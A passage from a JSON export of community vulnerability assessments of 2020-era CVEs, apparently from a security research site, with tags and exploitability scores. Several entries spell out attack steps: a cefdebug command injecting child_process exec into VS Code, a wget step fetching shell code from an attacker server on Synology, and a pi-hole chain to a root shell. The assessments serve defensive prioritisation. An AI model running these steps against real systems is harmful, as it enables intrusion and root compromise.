        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "3da9dfc9-a1c9-4e1b-b64d-3dfbacd50ae5",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "072b0ab6-45bb-4b37-8cfe-0b6664356d84",
      "created": "2020-05-18T15:48:52.052339Z",
      "revisionDate": "2020-05-18T16:59:47.466485Z",
      "document": "This vulnerability came out recently and it is not only difficult to trigger, it also requires authentication and it would be unreliable and difficult to use for remote code execution.  So to be clear, this is mostly just a very difficult way to sabotage a computer you're already logged into.  The top-level method to exploit this vulnerability is a race condition that results in a use-after-free bug.  A write up exists here: https://0xeb-bp.github.io/blog/2020/05/12/cve-2020-1015-analysis.html  I'm super happy that the blog authors come out immediately and recognize the scope and utility of this vulnerability: \r\n>This bug is likely not the most ideal candidate for a fully functioning and reliable exploit. Especially when taking in consideration other EoPs from the April 2020 security patches with an exploitability rating of 1.\r\nMicrosoft has classified this as a '2' (https://www.microsoft.com/en-us/msrc/exploitability-index):\r\n> Microsoft analysis has shown that while exploit code could be created, an attacker would likely have difficulty creating the code, requiring expertise and/or sophisticated timing, and/or varied results when targeting the affected product. Moreover, Microsoft has not recently observed a trend of this type of vulnerability being actively exploited in the wild. This makes it a less attractive target for attackers. That said, customers who reviewed the security update and determined its applicability within their environment should still treat this as a material update. If they are prioritizing against other highly exploitable vulnerabilities, they could rank this lower in their deployment priority.\r\n\r\nThe exploit works because a critical code section was not properly defined during the deletion and freeing of a shared object in memory.  A critical code section prevents other threads from accessing memory as it is being created and populated.  Critical code sections increase runtime, but they secure objects in memory as they are being built.  In this case, the critical code section takes place between the deletion and free of the object.  It is possible to access the memory location after the contents are deleted, but before the contents are freed.\r\n\r\nIt is possible that an attacker can take advantage of the race condition and modify the data in the registrant structure:\r\n```\r\nstruct registrant {\r\n    // pointer to next\r\n    next: usize,\r\n    // pointer to prev\r\n    prev: usize,\r\n    // set to 1 after alloc\r\n    count: u32, \r\n    // Flags\r\n    flags: u32, \r\n    // handle we pass\r\n    handle: usize, \r\n    // heap alloc which is size of service_name + 2 for null char\r\n    service_name: usize,\r\n    // sessionID\r\n    session_id: u32,\r\n    // unknown, might be two u16s\r\n    unknown: u32,\r\n}\r\n```\r\n\r\nWhile it may be possible to take over this structure and achieve RCE, the path is not immediately apparent, and according to Microsoft, it is likely unreliable.\r\n\r\nUnfortunately, looking throught he PoC here (https://github.com/0xeb-bp/cve-2020-1015/blob/master/cve_2020_1015.cpp), I am unable to locate an action that would be \"known evil\" to allow blue team members to flag on it.",
      "score": 4,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "difficult_to_develop",
          "post_auth",
          "no_useful_data",
          "high_privilege_access"
        ],
        "attacker-value": 2,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "d20b4535-5af7-4485-be79-726f546e9200",
      "editorId": "476d5018-c9fe-422d-825b-d5601af6bcf0",
      "topicId": "b43d414f-6140-4931-bed8-4ae15ffdfae1",
      "created": "2020-05-18T16:52:33.554236Z",
      "revisionDate": "2020-05-18T16:52:33.559223Z",
      "document": "## Vulnerability: \r\n* Remote code execution vulnerabilities exist in the way that the Microsoft Server Message Block 1.0 (SMBv1) server handles certain requests. An attacker who successfully exploited the vulnerabilities could gain the ability to execute code on the target server. To exploit the vulnerability, in most situations, an unauthenticated attacker could send a specially crafted packet to a targeted SMBv1 server.\r\n\r\n## Vulnerability Disclosure date: \r\n* 2017-03-14\r\n\r\n## Operating Systems Affected: \r\n* Windows 2000 SP4\r\n* Windows XP SP2, SP3\r\n* Windows 2003 SP2 and R2 SP2\r\n* Microsoft Windows Vista SP2\r\n* Windows Server 2008 SP1, SP2 and R2 SP1\r\n* Windows 7 SP1\r\n* Windows 8.1\r\n* Windows Server 2012 Gold and R2\r\n* Windows RT 8.1\r\n* Windows 10 Gold, 1511, and 1607 and Pro 10240\r\n* Windows Server 2016 \r\n\r\n## Vulnerability Severity:\r\n* Critical\r\n\r\n## Vulnerability Fix: \r\n* Apply the MS17-010 security update.\r\n\r\n## Vulnerability POC:\r\n* [SMB Remote Code Execution Scanner (Nmap)] (https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html)\r\n* [SMB Remote Code Execution Scanner (Metasploit)] (https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_ms17_010)\r\n* ['EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit)] (https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_psexec)\r\n* [Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution] (https://www.exploit-db.com/exploits/42031)\r\n* [Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution] (https://www.exploit-db.com/exploits/42030)\r\n* [Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution] (https://www.exploit-db.com/exploits/41987)\r\n* [Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution] (https://www.exploit-db.com/exploits/42315)\r\n* [Windows 2000/XP/2003/2008/7/8.1 (x86) & Windows XP/2003 R2/2008/7/2008 R2/8.1/2012 R2/10 Pro/2016 (x64) 'Send and Execute' SMB Remote Code Execution(generate payload for reverse shell)] (https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py)\r\n    \r\n## NSA Exploit Information:\r\n* **Eternalblue** requires only access to IPC$ to exploit a target while other exploits require access to named pipe too. So the exploit always works against Windows < 8 in all configuration (if tcp port 445 is accessible). However, Eternalblue has a chance to crash a target higher than other exploits.\r\n* **Eternalchampion** requires access to named pipe. The exploit has no chance to crash a target.\r\n* **Eternalromance** requires access to named pipe. The exploit can target Windows < 8 because the bug for info leak is fixed in Windows 8. The exploit should have a chance to crash a target lower than Eternalblue. I never test a reliable of the exploit.\r\n* **Eternalsynergy** requires access to named pipe. I believe this exploit is modified from Eternalromance to target Windows 8 and later. Eternalsynergy uses another bug for info leak and does some trick to find executable memory (I do not know how it works because I read only output log and pcap file).\r\n    ",
      "score": 1,
      "metadata": {
        "tags": [
          "common_enterprise",
          "pre_auth",
          "default_configuration",
          "high_privilege_access",
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "777b3db3-d03a-4675-a9a7-dff62cbe904e",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "63951c83-e8d3-4463-a6df-155abfb10220",
      "created": "2020-05-18T18:49:12.130204Z",
      "revisionDate": "2020-05-18T20:12:05.490874Z",
      "document": "Works against pi-hole <=4.4, which was just about recent at the time of release.\r\nExcellent write-up here: https://frichetten.com/blog/cve-2020-11108-pihole-rce/\r\n\r\nThe CVE encompasses a file overwrite, however overwriting the right files can escalate privs.\r\nThe CVE is basically that a new blocklist can be added, and then an update is forced (`gravity` is pihole terminology for this) to pull in the blocklist content.  PHP content is then written to a file within the webroot.\r\n\r\nHow the real chain of exploit works is this:\r\n\r\n1. writes a `sudo` pihole command to launch `teleporter`, effectively running a priv esc. `sudo pihole -a -t` is the command to do this.  pihole is in sudoers, so we won't need to provide a password.  This file is stored at an arbitrary location within the webroot.\r\n2. writes our payload to `teleporter.php`, overwriting, the content.\r\n3. visit the arbitrary file set in phase 1, which launches the pihole command.  `-t` executes `teleporter.php`, which gives us a root shell.\r\n\r\nMost of the restrictions for this exploit are focused around  adding the blocklist.  Due to encoding, formatting, etc, we are only able to provide an IP.  No port, or file name.\r\n\r\nWith this in mind, exploitation takes many steps.  In theory, w/o these restrictions, you'd set 2 block lists (phase 1, and 2), update gravity twice to pull in the files, and done.  You would have set each block list to a diff URL thus being able to differentiate them.\r\n\r\nHowever, since you aren't able to do that, the actual chain looks more like this:\r\n\r\n1. add blocklist for phase 1\r\n2. update gravity and `200 OK` the request\r\n3. update gravity and send back your phase 1 command.\r\n4. add blocklist for phase 2\r\n5. update gravity and `200 OK` the request\r\n6. update gravity and send back your phase 2 command.\r\n7. hit the URL stored for phase 1.\r\n",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access",
          "post_auth"
        ],
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "6a9aced3-6aa2-435d-98d4-6f78932abadd",
      "editorId": "476d5018-c9fe-422d-825b-d5601af6bcf0",
      "topicId": "a51cc742-f2b2-4457-874b-faca8009e8c2",
      "created": "2020-05-20T02:28:26.865014Z",
      "revisionDate": "2020-07-20T20:07:53.795561Z",
      "document": "## Vulnerability: \r\n* An elevation of privilege vulnerability exists in Visual Studio Code when it exposes a debug listener to users of a local computer. A local attacker who successfully exploited the vulnerability could inject arbitrary code to run in the context of the current user. If the current user is logged on with administrative user rights, an attacker could take control of the affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.\r\n\r\n## Software Versions Affected:\r\n* All versions < 1.39.1\r\n\r\n## Vulnerability Severity:\r\n* High\r\n\r\n## Vulnerability Fix:\r\n* Upgrade VS Code to version 1.39.1 or later.\r\n\r\n## Vulnerability POC:\r\n\r\n* If Visual Studio code runs as Administrator, privileges can be elevated to the highest level, i.e. NT AUTHORITY\\SYSTEM.\r\n* If Visual Studio Code runs as another user, command execution can be achieved as that user.\r\n* If Visual Studio Code runs in High Integrity context,  any UAC settings can bypassed and can elevate from Low/Medium levels.\r\n\\\r\n* Linux ([Article](https://iwantmore.pizza/posts/cve-2019-1414.html) detailing the exploit): \r\n    1. ps aux | grep inspect\r\n        * Find the debug port\r\n    2. node [index.js](https://github.com/phra/inspector-exploiter) 127.0.0.1 <PORT> <COMMAND>\r\n        * Run index.js supplied with the ip address, port, and command you want to run\r\n\\\r\n* Windows:\r\n    1. [./cefdebug.exe](https://github.com/taviso/cefdebug) \r\n        * Find the debug port\r\n        * cefdebug is a minimal commandline utility and/or reference code for using libwebsockets to connect to an electron/CEF/chromium debugger.\r\n    2 ./cefdebug.exe --url ws://127.0.0.1:<PORT>/<UUID> --code \"process.mainModule.require('child_process').exec('<COMMAND>')\"\r\n        * Run cefdebug supplied with the debug websocket url and the command you want to run\r\n\r\n\r\n",
      "score": 2,
      "metadata": {
        "tags": [
          "easy_to_develop"
        ],
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        }
      ]
    },
    {
      "id": "2f655367-6662-4af0-a2f8-ae5e1c9f8b21",
      "editorId": "97bf384d-2eca-47f2-b98a-28bc8378baf2",
      "topicId": "bf9f05bb-f460-4011-9752-07b39f64d863",
      "created": "2020-05-20T12:19:03.305782Z",
      "revisionDate": "2020-05-26T11:14:02.608237Z",
      "document": "AUTHENTICATED command execution in `webman/modules/StorageManager/smart.cgi` through either a `GET` or `POST` request. \r\nVariables for the request look as such:\r\n```\r\n        'action' => 'apply',\r\n        'operation' => 'quick',\r\n        'disk' => \"/dev/sda\"\r\n```\r\n\r\nThe disk field is vulnerable.  However, that's just where this fun begins.  The `disk` field is required to be 'semi' disk correct.  AKA you can't just have nothing there, or `a`, however `/dev/sd` did seem to work.  Next, when the command is passed off, the entire `disk` field is limited to 30 characters.  After shortening to `/dev/sd` and then adding ticks ('`') you are left with 22 characters.  Pretty tight spacing.\r\n\r\nTo circumvent this restriction, the following was done:\r\n1. in < 22 characters, `echo -n` and ip:port to a file (`/a`).\r\n2. use `wget -i /a -O <file>` to then pull back shell code from a attacker controlled HTTP server\r\n3. execute the payload\r\n\r\nMost likely step 1 will need to be done in > 1 steps.\r\n\r\nExploitation grants root privileges.",
      "score": 2,
      "metadata": {
        "tags": [
          "post_auth",
          "default_configuration",
          "high_privilege_access"
        ],
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "6b034478-37fa-49c2-98b2-28f8c64646b0",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "5635a082-a142-45a9-a677-dab47f32bd83",
      "created": "2020-05-20T13:02:18.730986Z",
      "revisionDate": "2020-06-10T21:05:06.563498Z",
      "document": "A vulnerability exists in how Microsoft's XPS documents are processed using .NET that can be leveraged to execute code using a deserialization attack. XPS files are effectively ZIP archives containing multiple member, of which ones `.fdoc`, and `.fpage` can be used as triggers. While this vulnerability was patched in May of 2020, it's related to a similar vulnerability patched in January of 2020, which patched the same usage of the XPS document's `.fdseq` member file types.\r\n\r\nThe default XPS viewer in Windows **does not use .NET to render the XPS document making it unaffected by this vulnerability**. A vulnerable application would need to be configured to process a maliciously crafted XPS document. Due to this, it is unclear if in practice this vulnerability will require user interaction or authentication to leverage.\r\n\r\nSee: https://www.mdsec.co.uk/2020/05/analysis-of-cve-2020-0605-code-execution-using-xps-files-in-net/",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise",
          "easy_to_develop",
          "pre_auth",
          "obscure_configuration"
        ],
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "19609cfa-a063-49ed-aad1-d022ce37e6bf",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "79cefc5b-daa4-495b-a586-3666b8d8c9db",
      "created": "2020-05-20T17:22:43.355342Z",
      "revisionDate": "2020-05-20T17:47:57.899111Z",
      "document": "To exploit this vulnerability an attacker would need to have access to at least one client and a domain that replies with a large volume of referral records, without glue records, that point to external victim sub domains. While resolving a name from the attacker client, for each referral record found, the resolver contacts the victim domain. This action can generate a large number of communications between the recursive resolver and the victim's authoritative DNS server to cause a Distributed Denial of Service (DDoS) attack.\r\n\r\nThis has had quite the bit of coverage (I'll add these to AKB metadata as well when I get a chance):\r\n\r\n- (celeb vuln site) http://www.nxnsattack.com/\r\n- (ISC advisory) https://kb.isc.org/docs/cve-2020-8616\r\n- (paper) https://arxiv.org/abs/2005.09107\r\n- (Wired exclusive) https://www.wired.com/story/dns-ddos-amplification-attack/\r\n- (RIPE commentary) https://labs.ripe.net/Members/petr_spacek/nxnsattack-upgrade-resolvers-to-stop-new-kind-of-random-subdomain-attack\r\n- (CISA) https://www.us-cert.gov/ncas/current-activity/2020/05/20/isc-releases-security-advisory-bind\r\n- (CISA) https://www.us-cert.gov/ncas/current-activity/2020/05/20/microsoft-releases-security-advisory-windows-dns-servers\r\n\r\n84 of the Fortune 500 are vulnerable.\r\n\r\nMassive numbers (~1M) of old ISC BIND versions on the internet.\r\n\r\nWhile this does appear to require some wrangling, in certain configurations, it's a 1,000x amplification factor.\r\n\r\nIMO PoC will be forthcoming fairly quickly.\r\n\r\nImpacts other vendors DNS implementations (PowerDNS, Knot, Unbound all confirmed; others likely impacted).\r\n\r\nIt's \"just\" DoS, but 2020 DBIR noted the significant uptick of that in 2019 and it's been \"a thing\" in 2020.\r\n\r\nService disruptions for remote workforce could be severe.\r\n\r\n\r\n",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "06a86f3f-bc04-4222-ae10-0b86ee95c2ef",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "79cefc5b-daa4-495b-a586-3666b8d8c9db",
      "created": "2020-05-20T17:47:41.200768Z",
      "revisionDate": "2020-05-20T17:48:12.167411Z",
      "document": "This isn't going to be useful to a pen tester other than a report note, so don't expect this to get a lot of interest to anyone who is trying to _not_ get noticed. This will be useful I think as a nation-state level attack or in ransom-ware type scenarios, but there are plenty of other DoS techniques out there as well. ",
      "score": 2,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "pre_auth",
          "no_useful_data",
          "default_configuration",
          "common_enterprise"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "c07c7976-d6f5-48e9-ab05-073648e6d62f",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "a1cdd92e-0914-48f5-94ec-0607f6ddb0c9",
      "created": "2020-05-20T18:57:42.70036Z",
      "revisionDate": "2020-06-02T14:19:49.728526Z",
      "document": "The software requires purchase to download, and a VMware login is required to access the download page. The \"Open Source Disclosure Package\" contains only open-source JARs - no patch to analyze.\r\n\r\nVMware provides a workaround [here](https://kb.vmware.com/s/article/79091) in the form of a [shell script](https://kb.vmware.com/sfc/servlet.shepherd/version/download/068f400000HTuq5AAD), reproduced below.\r\n\r\n```bash\r\n#!/bin/bash\r\n\r\n# Copyright 2020 VMware, Inc.  All rights reserved.\r\n\r\n# This script patches vCloud Director cell to protect against CVE-2020-3956\r\n# 1. download 'WA_CVE-2020-3956.sh' in all vCD Servers repeat steps from 2-4 in all servers\r\n# 2. chmod 740 WA_CVE-2020-3956.sh\r\n# 3. Run ./WA_CVE-2020-3956.sh\r\n\r\nreadonly VCD_HOME=\"/opt/vmware/vcloud-director\"\r\nreadonly BVAL_ROOT_DIR=\"$VCD_HOME/system/org/apache/bval/org.apache.bval.bundle\"\r\nreadonly VMW_BVAL_DIR=\"$BVAL_ROOT_DIR/1.1.1.vmw\"\r\nreadonly BVAL_DIR=\"$BVAL_ROOT_DIR/1.1.1\"\r\nreadonly ELF_CLASS=\"org/apache/bval/el/ELFacade*.class\"\r\nreadonly ZIP_CMD=\"/usr/bin/zip\"\r\n\r\nWIDTH=80\r\n\r\nfunction is_zip_pkg_not_found()\r\n{\r\n    [ ! -f \"$ZIP_CMD\" ]\r\n}\r\n\r\nfunction is_bval_found()\r\n{\r\n    [ -f \"$BVAL_DIR/org.apache.bval.bundle-1.1.1.jar\" ]\r\n}\r\n\r\nfunction is_bval_vmw_found()\r\n{\r\n\t[ -f \"$VMW_BVAL_DIR/org.apache.bval.bundle-1.1.1.vmw.jar\" ]\r\n}\r\n\r\nfunction start_vcd () {\r\n    /etc/init.d/vmware-vcd restart\r\n    if [ $? -ne 0 ]; then\r\n        fmt -w$WIDTH <<EOF\r\nStart up failed; you should review the logs in ${VCD_HOME}/logs for details.\r\nEOF\r\n    fi\r\n}\r\n\r\nfunction service_start()\r\n{\r\n    chown vcloud:vcloud \"$BVAL_DIR\"/org.apache.bval.bundle-1.1.1.jar\r\n    chown root:vcloud \"$VCD_HOME\"/bin/vmware-vcd-cell-common\r\n    chmod 0640 \"$VCD_HOME\"/bin/vmware-vcd-cell-common\r\n    echo \"--------------------------------------------------------------\"\r\n    echo \"This cell has been patched. Restarting service...             \"\r\n    echo \"--------------------------------------------------------------\"\r\n\r\n    start_vcd\r\n\r\n}\r\n\r\nfunction security_fix()\r\n{\r\n    if is_bval_found; then\r\n      class_count=$($ZIP_CMD -sf $BVAL_DIR/org.apache.bval.bundle-1.1.1.jar | grep $ELF_CLASS | wc -l)\r\n      if [ \"$class_count\" != 0 ]; then\r\n\t    $ZIP_CMD -dq $BVAL_DIR/org.apache.bval.bundle-1.1.1.jar $ELF_CLASS\r\n        service_start\r\n      else\r\n        echo \"This cell is protected against CVE-2020-3956\"\r\n        echo \"--------------------------------------------------------------\"\r\n      fi\r\n    fi\r\n}\r\n\r\n\r\necho \"Assessing your cell .....\"\r\necho \"--------------------------------------------------------------\"\r\n\r\nif [ -d \"$VCD_HOME\" ]; then\r\n    echo \"vCloud Director cell path found and scanning your system, \"\r\n    if is_bval_vmw_found; then\r\n        echo \"--------------------------------------------------------------\"\r\n        echo \"This cell is protected against CVE-2020-3956\"\r\n        echo \"--------------------------------------------------------------\"\r\n        exit 0\r\n    elif is_zip_pkg_not_found; then\r\n        echo \"---------------------------------------------------------------\"\r\n        echo \"zip package not found, it must be installed to run this script.\"\r\n        echo \"---------------------------------------------------------------\"\r\n        exit 0\r\n    fi\r\n    security_fix\r\n    else\r\n      echo \"--------------------------------------------------------------\"\r\n      echo \"vCloud Director cell path not found. \"\r\n      echo \"--------------------------------------------------------------\"\r\n      exit 0\r\nfi\r\n```\r\n\r\nThe workaround removes any `org/apache/bval/el/ELFacade*.class` files from `/opt/vmware/vcloud-director/system/org/apache/bval/org.apache.bval.bundle/1.1.1/org.apache.bval.bundle-1.1.1.jar`. [ELFacade](https://github.com/apache/bval/blob/master/bval-jsr/src/main/java/org/apache/bval/el/ELFacade.java) deals with Java EL expressions, which suggests an EL injection vulnerability.\r\n\r\nNote that this vulnerability is **post-auth**! This somewhat limits the exposure of the vuln, but no one said getting creds was difficult. Patch!",
      "score": 6,
      "metadata": {
        "tags": [
          "common_enterprise",
          "post_auth"
        ],
        "attacker-value": 4,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "bca4960e-edd6-4baa-a24c-f63f67e907d0",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "b486c30c-eb92-43ff-9db9-04d515681a33",
      "created": "2020-05-20T20:00:24.074704Z",
      "revisionDate": "2020-05-27T08:49:14.750176Z",
      "document": "A vulnerability exists within the Win32k subsystem (provided by the `win32k.sys`, `win32kbase.sys`, and `win32kfull.sys` drivers) on Windows 10 that can be leveraged to trigger a Use-After-Free condition where by freed memory is used by `win32kbase!GreUnlockRegion`.\r\n\r\nFrom my testing of the [public PoC](https://cpr-zero.checkpoint.com/assets/attachments/cprid-2152/main.c), I found this bug unreliable to trigger. Even with Driver Verifier enabled and standard settings (including SpecialPool) enabled, no exception and Blue Screen occurred. From reading through the PoC it looks like there is some kind of edge condition (possibly a race) that requires the PoC to re-execute itself (via `CreateProcessA`) to attempt to trigger the vulnerability.\r\n\r\nDo to the unreliable nature of the PoC and the difficulty of replacing the freed memory within the heap, I believe this vulnerability would be difficult to exploit reliably. Successful execution however would take place within the Windows Kernel, effectively offering a complete compromise of the affected system.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration",
          "common_enterprise",
          "pre_auth",
          "high_privilege_access",
          "difficult_to_develop"
        ],
        "attacker-value": 3,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
